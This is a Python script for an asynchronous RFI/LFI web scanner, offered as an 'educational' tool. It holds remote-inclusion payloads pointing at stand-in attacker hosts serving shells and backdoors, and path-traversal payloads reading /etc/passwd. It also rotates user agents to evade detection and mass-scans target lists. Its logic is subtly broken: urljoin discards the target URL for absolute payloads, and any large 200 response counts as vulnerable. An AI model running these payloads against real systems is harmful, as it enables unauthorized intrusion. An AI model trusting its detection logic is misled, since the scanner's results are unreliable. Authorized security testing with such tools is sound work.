#!/usr/bin/env python3
"""
Modern RFI Scanner - Educational Security Tool
==============================================

This is a modernized version of an RFI (Remote File Inclusion) scanner
intended for educational and authorized security testing purposes only.

Author: Modern Security Tools
Version: 2.0
License: Educational Use Only

WARNING: This tool should only be used on systems you own or have explicit
permission to test. Unauthorized scanning is illegal in many jurisdictions.
"""

import asyncio
import aiohttp
import argparse
import logging
import random
import re
import sys
import time
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlparse
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('rfi_scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class ScanResult:
    """Represents a scan result"""
    url: str
    vulnerable: bool
    response_code: int
    response_size: int
    payload_used: str
    response_preview: str
    scan_time: float

class UserAgentRotator:
    """Rotates user agents to avoid detection"""
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
    ]
    
    @classmethod
    def get_random_agent(cls) -> str:
        return random.choice(cls.USER_AGENTS)

class PayloadGenerator:
    """Generates RFI test payloads"""
    
    @staticmethod
    def get_rfi_payloads() -> List[str]:
        """Returns a list of RFI test payloads"""
        return [
            "http://evil.com/shell.txt?",
            "http://attacker.com/backdoor.php?",
            "http://malicious.com/exploit.txt?",
            "http://test.com/response.txt?",
            "http://demo.com/test.txt?"
        ]
    
    @staticmethod
    def get_lfi_payloads() -> List[str]:
        """Returns a list of LFI test payloads"""
        return [
            "/../../../../../../../../etc/passwd",
            "/../../../../../../../../windows/win.ini",
            "/../../../../../../../../etc/hosts",
            "/../../../../../../../../proc/version",
            "/../../../../../../../../etc/issue"
        ]

class SearchEngine:
    """Handles search engine queries"""
    
    def __init__(self):
        self.session = None
        self.headers = {
            'User-Agent': UserAgentRotator.get_random_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(headers=self.headers)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def search_google(self, dork: str, max_results: int = 100) -> List[str]:
        """Search Google for potential targets"""
        # Note: This is a simplified version. Real implementation would need
        # to handle Google's anti-bot measures and rate limiting
        logger.info(f"Searching Google for: {dork}")
        # Placeholder implementation
        return []
    
    async def search_bing(self, dork: str, max_results: int = 100) -> List[str]:
        """Search Bing for potential targets"""
        logger.info(f"Searching Bing for: {dork}")
        # Placeholder implementation
        return []

class RFIScanner:
    """Main RFI scanner class"""
    
    def __init__(self, max_concurrent: int = 10, timeout: int = 10):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.results: List[ScanResult] = []
        self.session = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={'User-Agent': UserAgentRotator.get_random_agent()}
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_url(self, base_url: str, payload: str) -> ScanResult:
        """Test a single URL with a payload"""
        test_url = urljoin(base_url, payload)
        start_time = time.time()
        
        try:
            async with self.session.get(test_url) as response:
                content = await response.text()
                scan_time = time.time() - start_time
                
                # Check for common RFI indicators
                vulnerable = self._check_vulnerability(content, response.status)
                
                return ScanResult(
                    url=test_url,
                    vulnerable=vulnerable,
                    response_code=response.status,
                    response_size=len(content),
                    payload_used=payload,
                    response_preview=content[:200] + "..." if len(content) > 200 else content,
                    scan_time=scan_time
                )
                
        except Exception as e:
            logger.error(f"Error testing {test_url}: {e}")
            return ScanResult(
                url=test_url,
                vulnerable=False,
                response_code=0,
                response_size=0,
                payload_used=payload,
                response_preview=f"Error: {str(e)}",
                scan_time=time.time() - start_time
            )
    
    def _check_vulnerability(self, content: str, status_code: int) -> bool:
        """Check if response indicates vulnerability"""
        # Common indicators of successful RFI
        indicators = [
            "root:x:",
            "SafeModeOFF",
            "SafeOFF",
            "<?php",
            "eval(",
            "system(",
            "shell_exec",
            "passthru",
            "exec("
        ]
        
        for indicator in indicators:
            if indicator.lower() in content.lower():
                return True
        
        # Check for unusual status codes or response patterns
        if status_code == 200 and len(content) > 1000:
            # Large response might indicate successful inclusion
            return True
            
        return False
    
    async def scan_targets(self, targets: List[str], scan_type: str = "rfi") -> List[ScanResult]:
        """Scan multiple targets"""
        if scan_type == "rfi":
            payloads = PayloadGenerator.get_rfi_payloads()
        else:
            payloads = PayloadGenerator.get_lfi_payloads()
        
        tasks = []
        for target in targets:
            for payload in payloads:
                task = self.test_url(target, payload)
                tasks.append(task)
        
        # Process in batches to avoid overwhelming servers
        batch_size = self.max_concurrent
        results = []
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            batch_results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, ScanResult):
                    results.append(result)
                    if result.vulnerable:
                        logger.warning(f"VULNERABLE: {result.url}")
        
        return results
    
    def save_results(self, filename: str = "scan_results.json"):
        """Save scan results to file"""
        vulnerable_results = [r for r in self.results if r.vulnerable]
        
        output = {
            "scan_summary": {
                "total_scanned": len(self.results),
                "vulnerable_found": len(vulnerable_results),
                "scan_type": "RFI/LFI",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            },
            "vulnerable_targets": [
                {
                    "url": r.url,
                    "payload": r.payload_used,
                    "response_code": r.response_code,
                    "response_preview": r.response_preview,
                    "scan_time": r.scan_time
                }
                for r in vulnerable_results
            ]
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        logger.info(f"Results saved to {filename}")

class ReportGenerator:
    """Generates scan reports"""
    
    @staticmethod
    def generate_text_report(results: List[ScanResult]) -> str:
        """Generate a text report"""
        vulnerable = [r for r in results if r.vulnerable]
        
        success_rate = (len(vulnerable)/len(results)*100) if len(results) > 0 else 0
        report = f"""
RFI/LFI Scan Report
==================
Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}

Summary:
- Total URLs scanned: {len(results)}
- Vulnerable URLs found: {len(vulnerable)}
- Success rate: {success_rate:.2f}%

Vulnerable Targets:
"""
        
        for i, result in enumerate(vulnerable, 1):
            report += f"""
{i}. URL: {result.url}
   Payload: {result.payload_used}
   Response Code: {result.response_code}
   Response Size: {result.response_size} bytes
   Scan Time: {result.scan_time:.2f}s
   Response Preview: {result.response_preview[:100]}...
"""
        
        return report

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Modern RFI/LFI Scanner - Educational Security Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: This tool is for educational purposes only. Only use on systems
you own or have explicit permission to test. Unauthorized scanning is illegal.

Examples:
  python modern_rfi_scanner.py --targets targets.txt --type rfi
  python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type lfi
        """
    )
    
    parser.add_argument("--targets", help="File containing target URLs")
    parser.add_argument("--url", help="Single target URL")
    parser.add_argument("--type", choices=["rfi", "lfi"], default="rfi", 
                       help="Scan type (RFI or LFI)")
    parser.add_argument("--concurrent", type=int, default=10,
                       help="Maximum concurrent connections")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds")
    parser.add_argument("--output", default="scan_results.json",
                       help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true",
                       help="Verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Load targets
    targets = []
    if args.targets:
        try:
            with open(args.targets, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Target file not found: {args.targets}")
            return 1
    elif args.url:
        targets = [args.url]
    else:
        logger.error("Must specify either --targets or --url")
        return 1
    
    if not targets:
        logger.error("No valid targets found")
        return 1
    
    logger.info(f"Starting {args.type.upper()} scan of {len(targets)} targets")
    
    # Run scan
    async def run_scan():
        async with RFIScanner(max_concurrent=args.concurrent, timeout=args.timeout) as scanner:
            results = await scanner.scan_targets(targets, args.type)
            scanner.results = results
            scanner.save_results(args.output)
            
            # Generate and display report
            report = ReportGenerator.generate_text_report(results)
            print(report)
            
            return len([r for r in results if r.vulnerable])
    
    try:
        vulnerable_count = asyncio.run(run_scan())
        logger.info(f"Scan completed. Found {vulnerable_count} vulnerable targets.")
        return 0 if vulnerable_count == 0 else 1
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        return 1
    except Exception as e:
        logger.error(f"Scan failed: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())